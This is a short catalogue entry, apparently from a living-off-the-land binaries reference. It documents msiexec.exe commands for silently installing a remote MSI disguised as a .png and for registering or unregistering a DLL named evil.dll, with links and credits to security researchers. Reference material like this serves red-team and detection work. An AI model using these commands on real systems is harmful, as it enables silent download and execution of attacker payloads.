## Msiexec.exe
```

msiexec /q /i http://192.168.100.3/tmp/cmd.png
Installs the target remote & renamed .MSI file silently.

msiexec /y "C:\folder\evil.dll"
Calls DLLRegisterServer to register the target DLL.

msiexec /z "C:\folder\evil.dll"
Calls DLLRegisterServer to un-register the target DLL.
```
* Windows binary: True   
* Bypasses Default AppLocker Rules: False   
* Mitre: []()   
   
* Links:   
  * https://pentestlab.blog/2017/06/16/applocker-bypass-msiexec/
  * https://twitter.com/PhilipTsukerman/status/992021361106268161
   
* File path:   
  * c:\windows\system32\msiexec.exe
  * c:\windows\sysWOW64\msiexec.exe
   
* Acknowledgement:   
  * Name: netbiosX
    * Twitter: [@netbiosX](https://twitter.com/@netbiosX)
    * Blog: https://pentestlab.blog/
  * Name: Philip Tsukerman
    * Twitter: [@PhilipTsukerman](https://twitter.com/@PhilipTsukerman)
    * Blog: 
   
OS:  
